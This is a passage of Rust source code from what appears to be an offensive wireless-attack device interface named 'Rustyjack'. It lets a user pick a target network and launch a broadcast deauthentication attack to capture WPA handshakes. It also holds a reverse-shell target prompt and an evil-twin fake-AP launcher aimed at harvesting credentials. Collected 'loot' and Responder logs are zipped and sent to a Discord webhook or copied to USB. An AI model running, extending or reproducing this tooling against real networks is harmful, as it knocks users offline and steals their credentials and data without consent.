            self.display.draw_menu(title, &slice, displayed_selected, &overlay)?;

            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if index == 0 { index = total - 1; } else { index -= 1; }
                }
                ButtonAction::Down => index = (index + 1) % total,
                ButtonAction::Select => return Ok(Some(index)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => { self.menu_state.home(); return Ok(None); }
                ButtonAction::Reboot => { self.confirm_reboot()?; }
                _ => {}
            }
        }
    }

    fn prompt_octet(&mut self, prefix: &str) -> Result<Option<u8>> {
        let mut value: i32 = 1;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![
                "Reverse shell target".to_string(),
                format!("{prefix}.{}", value.clamp(0, 255)),
                "UP/DOWN to adjust".to_string(),
                "OK to confirm".to_string(),
            ];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => value = (value + 1).min(255),
                ButtonAction::Down => value = (value - 1).max(0),
                ButtonAction::Select => return Ok(Some(value as u8)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    fn handle_network_selection(&mut self, network: &WifiNetworkEntry) -> Result<()> {
        let Some(ssid) = network
            .ssid
            .as_deref()
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
        else {
            self.show_message("Wi-Fi", ["Hidden SSID - configure via CLI"])?;
            return Ok(());
        };
        let mut details = vec![format!("SSID: {ssid}")];
        if let Some(signal) = network.signal_dbm {
            details.push(format!("Signal: {signal} dBm"));
        }
        if let Some(channel) = network.channel {
            details.push(format!("Channel: {channel}"));
        }
        if let Some(bssid) = network.bssid.as_deref() {
            details.push(format!("BSSID: {bssid}"));
        }
        details.push(if network.encrypted {
            "Encrypted: yes".to_string()
        } else {
            "Encrypted: no".to_string()
        });
        self.show_message("Network", details.iter().map(|s| s.as_str()))?;

        let actions = vec!["Connect".to_string(), "Set Target".to_string(), "Back".to_string()];
        if let Some(choice) = self.choose_from_list("Network action", &actions)? {
            match choice {
                0 => {
                    // Connect
                    if self.connect_profile_by_ssid(&ssid)? {
                        // message handled in helper
                    } else {
                        let msg = vec![format!("No saved profile for {ssid}")];
                        self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
                    }
                }
                1 => {
                    // Set as Target for deauth attack. We will accept a target even
                    // if the network record omits the BSSID. When BSSID is missing
                    // we store an empty string — deauth attacks require a BSSID and
                    // will error later if it's absent, so the UI warns the user.
                    self.config.settings.target_network = ssid.clone();
                    self.config.settings.target_bssid = network.bssid.clone().unwrap_or_default();
                    self.config.settings.target_channel = network.channel.unwrap_or(0) as u8;

                    // Save config
                    let config_path = self.root.join("gui_conf.json");
                    if let Err(e) = self.config.save(&config_path) {
                        self.show_message("Error", [format!("Failed to save: {}", e)])?;
                    } else {
                        // Informative feedback — highlight missing BSSID if applicable
                        if self.config.settings.target_bssid.is_empty() {
                            self.show_message("Target Set", [
                                &format!("SSID: {}", ssid),
                                "BSSID: (none)",
                                &format!("Channel: {}", self.config.settings.target_channel),
                                "",
                                "Note: target has no BSSID. Deauth requires a BSSID",
                            ])?;
                        } else {
                            self.show_message("Target Set", [
                                &format!("SSID: {}", ssid),
                                &format!("BSSID: {}", self.config.settings.target_bssid),
                                &format!("Channel: {}", self.config.settings.target_channel),
                                "",
                                "Ready for Deauth Attack",
                            ])?;
                        }
                    }
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn handle_profile_selection(&mut self, profile: &WifiProfileSummary) -> Result<()> {
        let actions = vec![
            "Connect".to_string(),
            "Delete".to_string(),
            "Back".to_string(),
        ];
        if let Some(choice) =
            self.choose_from_list(&format!("Profile {}", profile.ssid), &actions)?
        {
            match choice {
                0 => self.connect_named_profile(&profile.ssid)?,
                1 => self.delete_profile(&profile.ssid)?,
                _ => {}
            }
        }
        Ok(())
    }

    fn fetch_wifi_scan(&mut self) -> Result<WifiScanResponse> {
        let args = WifiScanArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Scan(args)))?;
        let resp: WifiScanResponse = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_profiles(&mut self) -> Result<Vec<WifiProfileSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::List,
        )))?;
        let resp: WifiProfilesResponse = serde_json::from_value(data)?;
        Ok(resp.profiles)
    }

    fn fetch_wifi_interfaces(&mut self) -> Result<Vec<InterfaceSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::List))?;
        let resp: WifiListResponse = serde_json::from_value(data)?;
        Ok(resp.interfaces)
    }

    fn fetch_route_snapshot(&mut self) -> Result<RouteSnapshot> {
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Status)))?;
        let resp: RouteSnapshot = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_status(&mut self) -> Result<WifiStatusOverview> {
        let args = WifiStatusArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Status(args)))?;
        let status: WifiStatusOverview = serde_json::from_value(data)?;
        Ok(status)
    }

    fn connect_profile_by_ssid(&mut self, ssid: &str) -> Result<bool> {
        let profiles = self.fetch_wifi_profiles()?;
        if !profiles.iter().any(|profile| profile.ssid == ssid) {
            return Ok(false);
        }
        self.connect_named_profile(ssid)?;
        Ok(true)
    }

    fn connect_named_profile(&mut self, ssid: &str) -> Result<()> {
        self.show_progress("Wi-Fi", ["Connecting...", ssid, "Please wait"])?;
        
        let args = WifiProfileConnectArgs {
            profile: Some(ssid.to_string()),
            ssid: None,
            password: None,
            interface: None,
            remember: false,
        };
        
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Connect(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Connected to {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("Connection failed:"), format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn delete_profile(&mut self, ssid: &str) -> Result<()> {
        let args = WifiProfileDeleteArgs {
            ssid: ssid.to_string(),
        };
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Delete(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Deleted {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn discord_upload(&mut self) -> Result<()> {
        // Check if webhook is configured first
        let webhook_path = self.root.join("discord_webhook.txt");
        let has_webhook = if webhook_path.exists() {
            if let Ok(content) = fs::read_to_string(&webhook_path) {
                let trimmed = content.trim();
                trimmed.starts_with("https://discord.com/api/webhooks/") && !trimmed.is_empty()
            } else {
                false
            }
        } else {
            false
        };
        
        if !has_webhook {
            return self.show_message("Discord Error", [
                "No webhook configured",
                "",
                "Create file:",
                "discord_webhook.txt",
                "with your webhook URL"
            ]);
        }
        
        let (temp_path, archive_path) = self.build_loot_archive()?;
        let args = DiscordSendArgs {
            title: "Rustyjack Loot".to_string(),
            message: Some("Complete loot archive".to_string()),
            file: Some(archive_path.clone()),
            target: None,
            interface: None,
        };
        let result = self.core.dispatch(Commands::Notify(NotifyCommand::Discord(
            DiscordCommand::Send(args),
        )));
        drop(temp_path);
        match result {
            Ok(_) => self.show_message("Discord", ["Loot uploaded"])?,
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Discord", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn transfer_to_usb(&mut self) -> Result<()> {
        // Find USB mount point
        let usb_path = match self.find_usb_mount() {
            Ok(path) => path,
            Err(_e) => {
                self.show_message("USB Transfer Error", [
                    "No USB drive detected",
                    "Please insert a USB drive",
                    "and try again"
                ])?;
                return Ok(());
            }
        };
        
        let loot_dir = self.root.join("loot");
        let responder_logs = self.root.join("Responder").join("logs");
        
        if !loot_dir.exists() && !responder_logs.exists() {
            self.show_message("USB Transfer", ["No loot to transfer"])?;
            return Ok(());
        }

        // Collect all files to transfer
        let mut files = Vec::new();
        if loot_dir.exists() {
            for entry in WalkDir::new(&loot_dir) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }
        if responder_logs.exists() {
            for entry in WalkDir::new(&responder_logs) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }

        if files.is_empty() {
            self.show_message("USB Transfer", ["No files to transfer"])?;
            return Ok(());
        }

        let total_files = files.len();
        let status = self.stats.snapshot();

        // Transfer files with progress
        for (idx, file_path) in files.iter().enumerate() {
            let progress = ((idx + 1) as f32 / total_files as f32) * 100.0;
            
            let filename = file_path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("file");
            
            self.display.draw_progress_dialog(
                "USB Transfer",
                filename,
                progress,
                &status
            )?;

            // Determine destination path
            let dest = if file_path.starts_with(&loot_dir) {
                let rel = file_path.strip_prefix(&loot_dir).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("loot").join(rel)
            } else if file_path.starts_with(&responder_logs) {
                let rel = file_path.strip_prefix(&responder_logs).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("ResponderLogs").join(rel)
            } else {
                continue;
            };

            // Create destination directory
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)?;
            }

            // Copy file
            fs::copy(file_path, &dest)?;
        }

        self.show_message("USB Transfer", [
            &format!("Transferred {} files", total_files),
            "to USB drive"
        ])?;
        
        Ok(())
    }

    fn find_usb_mount(&self) -> Result<PathBuf> {
        // First, find USB block devices by checking /sys/block/
        let usb_devices = self.find_usb_block_devices();
        
        if usb_devices.is_empty() {
            bail!("No USB storage device detected. Please insert a USB drive.");
        }
        
        // Now find mount points for these USB devices
        let mounts = self.read_mount_points()?;
        
        for usb_dev in &usb_devices {
            // Check for partitions (e.g., sda1, sdb1) or the device itself
            for (device, mount_point) in &mounts {
                // Match if device starts with the USB device name (handles partitions)
                // e.g., /dev/sda1 starts with "sda"
                let dev_name = device.strip_prefix("/dev/").unwrap_or(device);
                if dev_name.starts_with(usb_dev) {
                    // Verify it's writable
                    if self.is_writable_mount(Path::new(mount_point)) {
                        return Ok(PathBuf::from(mount_point));
                    }
                }
            }
        }
        
        // Fallback: check common mount points but be more selective
        let mount_points = [
            "/media",
            "/mnt",
            "/run/media",
        ];

        for base in &mount_points {
            let base_path = Path::new(base);
            if !base_path.exists() {
                continue;
            }

            // Iterate through subdirectories (usually named after user or device)
            if let Ok(entries) = fs::read_dir(base_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        // For /media and /run/media, check subdirectories too (user folders)
                        if let Ok(sub_entries) = fs::read_dir(&path) {
                            for sub_entry in sub_entries.flatten() {
                                let sub_path = sub_entry.path();
                                if sub_path.is_dir() && self.is_usb_storage_mount(&sub_path) {
                                    return Ok(sub_path);
                                }
                            }
                        }
                        // Also check direct mount
                        if self.is_usb_storage_mount(&path) {
                            return Ok(path);
                        }
                    }
                }
            }
        }

        bail!("No USB storage drive found. Please insert a USB drive.")
    }
    
    /// Find USB block devices by checking /sys/block/ for removable USB devices
    fn find_usb_block_devices(&self) -> Vec<String> {
        let mut usb_devices = Vec::new();
        
        let sys_block = Path::new("/sys/block");
        if !sys_block.exists() {
            return usb_devices;
        }
        
        if let Ok(entries) = fs::read_dir(sys_block) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                
                // Skip loop devices, ram disks, and mmcblk (SD cards - usually the boot drive)
                if name.starts_with("loop") || name.starts_with("ram") || name.starts_with("mmcblk") {
                    continue;
                }
                
                // Check if it's a removable device
                let removable_path = entry.path().join("removable");
                let is_removable = fs::read_to_string(&removable_path)
                    .map(|s| s.trim() == "1")
                    .unwrap_or(false);
                
                // Check if it's a USB device by looking at the device path
                let device_path = entry.path().join("device");
                let is_usb = if device_path.exists() {
                    // Follow symlink and check if path contains "usb"
                    fs::read_link(&device_path)
                        .map(|p| p.to_string_lossy().contains("usb"))
                        .unwrap_or(false)
                } else {
                    false
                };
                
                // Also check uevent for DRIVER=usb-storage
                let uevent_path = entry.path().join("device").join("uevent");
                let is_usb_storage = fs::read_to_string(&uevent_path)
                    .map(|s| s.contains("usb-storage") || s.contains("usb"))
                    .unwrap_or(false);
                
                if is_removable || is_usb || is_usb_storage {
                    // Make sure it has a size > 0 (actually a storage device)
                    let size_path = entry.path().join("size");
                    let has_size = fs::read_to_string(&size_path)
                        .map(|s| s.trim().parse::<u64>().unwrap_or(0) > 0)
                        .unwrap_or(false);
                    
                    if has_size {
                        usb_devices.push(name);
                    }
                }
            }
        }
        
        usb_devices
    }
    
    /// Read mount points from /proc/mounts
    fn read_mount_points(&self) -> Result<Vec<(String, String)>> {
        let contents = fs::read_to_string("/proc/mounts")
            .context("Failed to read /proc/mounts")?;
        
        let mut mounts = Vec::new();
        for line in contents.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let device = parts[0].to_string();
                let mount_point = parts[1].to_string();
                
                // Only consider actual device mounts (not tmpfs, proc, etc.)
                if device.starts_with("/dev/") {
                    mounts.push((device, mount_point));
                }
            }
        }
        
        Ok(mounts)
    }
    
    /// Check if a path is likely a USB storage mount (not a WiFi dongle, etc.)
    fn is_usb_storage_mount(&self, path: &Path) -> bool {
        // Must be writable
        if !self.is_writable_mount(path) {
            return false;
        }
        
        // Check filesystem type - USB storage typically uses vfat, exfat, ntfs, ext4
        // This helps exclude pseudo-filesystems and network mounts
        let mount_path_str = path.to_string_lossy();
        
        if let Ok(contents) = fs::read_to_string("/proc/mounts") {
            for line in contents.lines() {
                if line.contains(&*mount_path_str) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        let fs_type = parts[2];
                        // Common USB storage filesystems
                        if matches!(fs_type, "vfat" | "exfat" | "ntfs" | "ntfs3" | "ext4" | "ext3" | "ext2" | "fuseblk") {
                            return true;
                        }
                    }
                }
            }
        }
        
        false
    }

    fn is_writable_mount(&self, path: &Path) -> bool {
        // Try to create a test file to verify write access
        let test_file = path.join(".rustyjack_test");
        if fs::write(&test_file, b"test").is_ok() {
            let _ = fs::remove_file(&test_file);
            true
        } else {
            false
        }
    }

    fn build_loot_archive(&self) -> Result<(TempPath, PathBuf)> {
        let mut temp = NamedTempFile::new()?;
        {
            let mut zip = ZipWriter::new(&mut temp);
            let options = FileOptions::default().compression_method(CompressionMethod::Deflated);
            self.add_directory_to_zip(&mut zip, &self.root.join("loot"), "loot/", options.clone())?;
            self.add_directory_to_zip(
                &mut zip,
                &self.root.join("Responder").join("logs"),
                "ResponderLogs/",
                options,
            )?;
            zip.finish()?;
        }
        let temp_path = temp.into_temp_path();
        let path = temp_path.to_path_buf();
        Ok((temp_path, path))
    }

    fn add_directory_to_zip(
        &self,
        zip: &mut ZipWriter<&mut NamedTempFile>,
        dir: &Path,
        prefix: &str,
        options: FileOptions,
    ) -> Result<()> {
        if !dir.exists() {
            return Ok(());
        }
        for entry in WalkDir::new(dir) {
            let entry = entry?;
            if entry.file_type().is_file() {
                let rel = entry.path().strip_prefix(dir).unwrap_or(entry.path());
                let mut name = PathBuf::from(prefix);
                name.push(rel);
                let name = name.to_string_lossy().replace('\\', "/");
                zip.start_file(name, options)?;
                let data = fs::read(entry.path())?;
                zip.write_all(&data)?;
            }
        }
        Ok(())
    }

    fn choose_interface_name(&mut self, title: &str, names: &[String]) -> Result<Option<String>> {
        if names.is_empty() {
            self.show_message("Interfaces", ["No interfaces detected"])?;
            return Ok(None);
        }
        let labels: Vec<String> = names.iter().map(|n| format!(" {n}")).collect();
        Ok(self
            .choose_from_list(title, &labels)?
            .map(|idx| names[idx].clone()))
    }

    fn choose_interface_prompt(&mut self, title: &str) -> Result<Option<String>> {
        let (_, data) = self.core.dispatch(Commands::Hardware(HardwareCommand::Detect))?;
        let mut names: Vec<String> = Vec::new();
        if let Some(arr) = data.get("ethernet_ports").and_then(|v| v.as_array()) {
            for item in arr {
                if let Ok(info) = serde_json::from_value::<InterfaceSummary>(item.clone()) {
                    names.push(info.name);
                }
            }
        }
        if let Some(arr) = data.get("wifi_modules").and_then(|v| v.as_array()) {
            for item in arr {
                if let Ok(info) = serde_json::from_value::<InterfaceSummary>(item.clone()) {
                    names.push(info.name);
                }
            }
        }
        names.sort();
        names.dedup();
        self.choose_interface_name(title, &names)
    }

    fn toggle_discord(&mut self) -> Result<()> {
        self.config.settings.discord_enabled = !self.config.settings.discord_enabled;
        self.save_config()?;
        // No message needed as the menu label will update immediately
        Ok(())
    }
    
    fn show_hardware_detect(&mut self) -> Result<()> {
        self.show_progress("Hardware Scan", ["Detecting interfaces...", "Please wait"])?;
        
        match self.core.dispatch(Commands::Hardware(HardwareCommand::Detect)) {
            Ok((_, data)) => {
                let eth_count = data.get("ethernet_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let wifi_count = data.get("wifi_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let other_count = data.get("other_count").and_then(|v| v.as_u64()).unwrap_or(0);
                
                let ethernet_ports = data.get("ethernet_ports").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                let wifi_modules = data.get("wifi_modules").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                
                // Build list of detected interfaces (clickable)
                let mut all_interfaces = Vec::new();
                let mut labels = Vec::new();

                let active_interface = self.config.settings.active_network_interface.clone();
                
                for port in &ethernet_ports {
                    if let Some(name) = port.get("name").and_then(|v| v.as_str()) {
                        let label = if name == active_interface {
                            format!("{} *", name)
                        } else {
                            name.to_string()
                        };
                        labels.push(label);
                        all_interfaces.push(port.clone());
                    }
                }
                for module in &wifi_modules {
                    if let Some(name) = module.get("name").and_then(|v| v.as_str()) {
                        let label = if name == active_interface {
                            format!("{} *", name)
                        } else {
                            name.to_string()
                        };
                        labels.push(label);
                        all_interfaces.push(module.clone());
                    }
                }
                
                // If nothing to show, just present summary
                if all_interfaces.is_empty() {
                    let summary_lines = vec![
                        format!("Ethernet: {}", eth_count),
                        format!("WiFi: {}", wifi_count),
                        format!("Other: {}", other_count),
                    ];
                    self.show_message("Hardware Detected", summary_lines.iter().map(|s| s.as_str()))?;
                } else {
                    // Present clickable list and show details on selection
                    loop {
                        let Some(idx) = self.choose_from_menu("Detected interfaces", &labels)? else { break; };
                        
                        let info = &all_interfaces[idx];
                        let interface_name = info.get("name").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();
                        
                        // Build detail lines
                        let mut details = Vec::new();
                        details.push(format!("Name: {}", interface_name));
                        if let Some(kind) = info.get("kind").and_then(|v| v.as_str()) { details.push(format!("Kind: {}", kind)); }
                        if let Some(state) = info.get("oper_state").and_then(|v| v.as_str()) { details.push(format!("State: {}", state)); }
                        if let Some(ip) = info.get("ip").and_then(|v| v.as_str()) { details.push(format!("IP: {}", ip)); }
                        details.push("".to_string());
                        details.push("[OK] Set Active".to_string());
                        
                        self.display.draw_menu("Interface details", &details, usize::MAX, &self.stats.snapshot())?;
                        // Wait for action
                        loop {
                            let btn = self.buttons.wait_for_press()?;
                            match self.map_button(btn) {
                                ButtonAction::Select => {
                                    // Set this interface as active
                                    self.config.settings.active_network_interface = interface_name.clone();
                                    let config_path = self.root.join("gui_conf.json");
                                    if let Err(e) = self.config.save(&config_path) {
                                        self.show_message("Error", [format!("Failed to save: {}", e)])?;
                                    } else {
                                        self.show_message("Active Interface", [format!("Set to: {}", interface_name)])?;
                                    }
                                    // Refresh the labels to show new active indicator
                                    labels.clear();
                                    all_interfaces.clear();
                                    let active = self.config.settings.active_network_interface.clone();
                                    for port in &ethernet_ports {
                                        if let Some(name) = port.get("name").and_then(|v| v.as_str()) {
                                            let label = if name == active { format!("{} *", name) } else { name.to_string() };
                                            labels.push(label);
                                            all_interfaces.push(port.clone());
                                        }
                                    }
                                    for module in &wifi_modules {
                                        if let Some(name) = module.get("name").and_then(|v| v.as_str()) {
                                            let label = if name == active { format!("{} *", name) } else { name.to_string() };
                                            labels.push(label);
                                            all_interfaces.push(module.clone());
                                        }
                                    }
                                    break;
                                }
                                ButtonAction::Back => break,
                                ButtonAction::MainMenu => { self.menu_state.home(); break; }
                                ButtonAction::Reboot => { self.confirm_reboot()?; }
                                _ => {}
                            }
                        }
                    }
                }
            }
            Err(err) => {
                let msg = vec![format!("Scan failed: {}", err)];
                self.show_message("Hardware Error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }
    
    fn scan_wifi_networks(&mut self) -> Result<()> {
        self.show_progress("WiFi Scan", ["Scanning for networks...", "Please wait"])?;
        
        let scan_result = self.fetch_wifi_scan();
        
        match scan_result {
            Ok(response) => {
                if response.networks.is_empty() {
                    return self.show_message("WiFi Scan", ["No networks found"]);
                }
                
                // Build list of networks for selection
                let networks = response.networks;
                let mut labels = Vec::new();
                for net in &networks {
                    let ssid = net.ssid.as_deref().unwrap_or("<hidden>");
                    // Truncate SSID if too long for display
                    let ssid_display = if ssid.len() > 10 {
                        format!("{}...", &ssid[..10])
                    } else {
                        ssid.to_string()
                    };
                    let signal = net.signal_dbm.map(|s| format!("{}dB", s)).unwrap_or_default();
                    let ch = net.channel.map(|c| format!("c{}", c)).unwrap_or_default();
                    // Mark target networks with '*' if the ssid or bssid matches
                    // the currently configured target; show a lock indicator 'L'
                    // for encrypted networks so '*' is reserved for the selected target.
                    let bssid = net.bssid.as_deref().unwrap_or("");
                    let cur_target_bssid = self.config.settings.target_bssid.as_str();
                    let is_target = (!cur_target_bssid.is_empty() && cur_target_bssid == bssid)
                        || (!self.config.settings.target_network.is_empty() && self.config.settings.target_network == ssid);
                    let target_marker = if is_target { "*" } else { " " };
                    labels.push(format!("{} {} {} {}", target_marker, ssid_display, signal, ch));
                }
                
                // Interactive network list - loop until user backs out
                loop {
                    let choice = self.choose_from_menu("Select Network", &labels)?;
                    match choice {
                        Some(idx) => {
                            if let Some(network) = networks.get(idx) {
                                self.handle_network_selection(network)?;
                            }
                        }
                        None => break, // User pressed back
                    }
                }
            }
            Err(e) => {
                self.show_message("WiFi Scan Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn launch_deauth_attack(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        
        // Validate we have all required target info
        if target_bssid.is_empty() {
            return self.show_message("Deauth Attack", [
                "No target BSSID set",
                "Scan networks first",
                "and select a target"
            ]);
        }
        
        if target_channel == 0 {
            return self.show_message("Deauth Attack", [
                "No target channel set",
                "Scan networks first",
                "and select a target"
            ]);
        }
        
        if active_interface.is_empty() {
            return self.show_message("Deauth Attack", [
                "No active interface",
                "Set in Hardware Detect"
            ]);
        }
        
        // Show attack configuration
        self.show_message("Deauth Attack", [
            &format!("Target: {}", if target_network.is_empty() { &target_bssid } else { &target_network }),
            &format!("BSSID: {}", target_bssid),
            &format!("Channel: {}", target_channel),
            &format!("Interface: {}", active_interface),
            "Duration: 120s",
            "Press SELECT to start"
        ])?;
        let confirm = self.choose_from_list("Start Deauth?", &["Start".to_string(), "Cancel".to_string()])?;
        if confirm != Some(0) {
            return Ok(());
        }
        
        // Show progress stages for 120 second attack
        let progress_stages = vec![
            (0, "Killing processes..."),
            (2, "Monitor mode enabled"),
            (5, "Setting channel..."),
            (8, "Starting capture..."),
            (10, "Sending deauth burst"),
            (15, "Attack in progress..."),
            (30, "Monitoring for handshake"),
            (45, "Deauth burst sent..."),
            (60, "Halfway complete..."),
            (75, "Still capturing..."),
            (90, "Checking for handshake"),
            (100, "Attack continuing..."),
            (110, "Finalizing capture..."),
            (115, "Stopping monitor mode"),
        ];
        
        // Show initial message
        self.show_progress("Deauth Attack", [
            &format!("Target: {}", if target_network.is_empty() { &target_bssid } else { &target_network }),
            &format!("Channel: {} | {}", target_channel, active_interface),
            "Preparing attack...",
        ])?;
        
        // Launch attack in background thread while showing progress
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;
        
        let core = self.core.clone();
        let bssid = target_bssid.clone();
        let ssid = if target_network.is_empty() { None } else { Some(target_network.clone()) };
        let channel = target_channel;
        let iface = active_interface.clone();
        
        let result = Arc::new(Mutex::new(None));
        let result_clone = Arc::clone(&result);
        
        // Spawn attack thread
        thread::spawn(move || {
            let command = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                bssid,
                ssid,
                interface: iface,
                channel,
                duration: 120,      // 2 minutes for better handshake capture
                packets: 64,        // More packets per burst
                client: None,       // Broadcast to all clients
                continuous: true,   // Keep sending deauth throughout
                interval: 1,        // 1 second between bursts
            }));
            
            let r = core.dispatch(command);
            *result_clone.lock().unwrap() = Some(r);
        });
        
        // Show progress updates while attack runs (120 seconds)
        let attack_duration = 120u64;
        let start = std::time::Instant::now();
        let mut cancelled = false;
        let mut last_displayed_elapsed: u64 = u64::MAX; // Track to avoid redundant redraws
        
        loop {
            let elapsed = start.elapsed().as_secs();
            
            // Check for cancel button press
            match self.check_attack_cancel("Deauth")? {
                CancelAction::Continue => {}
                CancelAction::GoBack => {
                    cancelled = true;
                    break;
                }
                CancelAction::GoMainMenu => {
                    cancelled = true;
                    self.menu_state.home();
                    break;
                }
            }
            
            // Check if attack completed
            if result.lock().unwrap().is_some() {
                break;
            }
            
            // Only redraw when elapsed seconds changed
            if elapsed != last_displayed_elapsed {
                last_displayed_elapsed = elapsed;
                
                // Update stage message if we've reached a new stage
                let mut current_stage_msg = "Attack in progress...";
                for (time, msg) in &progress_stages {
                    if elapsed >= *time {
                        current_stage_msg = msg;
                    } else {
                        break;
                    }
                }
                
                let overlay = self.stats.snapshot();
                let message = if elapsed < attack_duration {
                    format!("{}s/{}s {}", elapsed, attack_duration, current_stage_msg)
                } else {
                    "Finalizing...".to_string()
                };
                self.display.draw_progress_dialog(
                    "Deauth [LEFT=Cancel]",
                    &message,
                    (elapsed as f32 / attack_duration as f32).min(1.0) * 100.0,
                    &overlay,
                )?;
            }
            
            thread::sleep(Duration::from_millis(50));
        }
        
        // If cancelled, show message and return
        if cancelled {
            self.show_message("Deauth Cancelled", [
                "Attack stopped early",
                "",
                "Partial results may be",
                "in loot/Wireless/"
            ])?;
            return Ok(());
        }
        
        // Get result
        let attack_result = result.lock().unwrap().take().unwrap();
        
        match attack_result {
            Ok((msg, data)) => {
                let mut result_lines = vec![msg];
                
                if let Some(captured) = data.get("handshake_captured").and_then(|v| v.as_bool()) {
                    if captured {
                        result_lines.push("HANDSHAKE CAPTURED!".to_string());
                        if let Some(hf) = data.get("handshake_file").and_then(|v| v.as_str()) {
                            result_lines.push(format!("File: {}", Path::new(hf).file_name().unwrap().to_str().unwrap()));
                        }
                    } else {
                        result_lines.push("No handshake detected".to_string());
                    }
                }
                
                if let Some(packets) = data.get("total_packets_sent").and_then(|v| v.as_u64()) {
                    result_lines.push(format!("Packets: {}", packets));
                }
                
                if let Some(bursts) = data.get("deauth_bursts").and_then(|v| v.as_u64()) {
                    result_lines.push(format!("Bursts: {}", bursts));
                }
                
                if let Some(log) = data.get("log_file").and_then(|v| v.as_str()) {
                    result_lines.push(format!("Log: {}", Path::new(log).file_name().unwrap().to_str().unwrap()));
                }
                
                result_lines.push("Check Loot > Wireless".to_string());
                
                self.show_message("Deauth Complete", result_lines.iter().map(|s| s.as_str()))?;
            }
            Err(e) => {
                self.show_message("Deauth Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn connect_known_network(&mut self) -> Result<()> {
        // Fetch saved WiFi profiles
        let profiles = match self.fetch_wifi_profiles() {
            Ok(p) => p,
            Err(e) => {
                return self.show_message("Connect", [
                    "Failed to load profiles",
                    "",
                    &format!("{}", e),
                ]);
            }
        };
        
        if profiles.is_empty() {
            return self.show_message("Connect", [
                "No saved profiles",
                "",
                "Profiles are stored in",
                "wifi/profiles/*.json",
                "",
                "Or scan networks and",
                "save credentials"
            ]);
        }
        
        // Let user select a profile
        let profile_names: Vec<String> = profiles.iter().map(|p| p.ssid.clone()).collect();
        let choice = self.choose_from_list("Select Network", &profile_names)?;
        
        let Some(idx) = choice else {
            return Ok(());
        };
        
        let selected = &profiles[idx];
        self.connect_named_profile(&selected.ssid)?;
        
        Ok(())
    }
    
    fn launch_evil_twin(&mut self) -> Result<()> {
        // Check if we have a target set
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if target_network.is_empty() || target_bssid.is_empty() {
            return self.show_message("Evil Twin", [
                "No target network set",
                "",
                "First scan networks and",
                "select 'Set as Target'"
            ]);
        }
        
        if active_interface.is_empty() {
            return self.show_message("Evil Twin", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect",
                "to configure interface"
            ]);
        }
        
        // Show attack configuration
        self.show_message("Evil Twin Attack", [
            &format!("SSID: {}", target_network),
            &format!("Ch: {} Iface: {}", target_channel, active_interface),
            "",
            "Creates fake AP with same",
            "SSID to capture client",
            "credentials.",
            "",
            "Press SELECT to start"
        ])?;
        
        // Confirm start
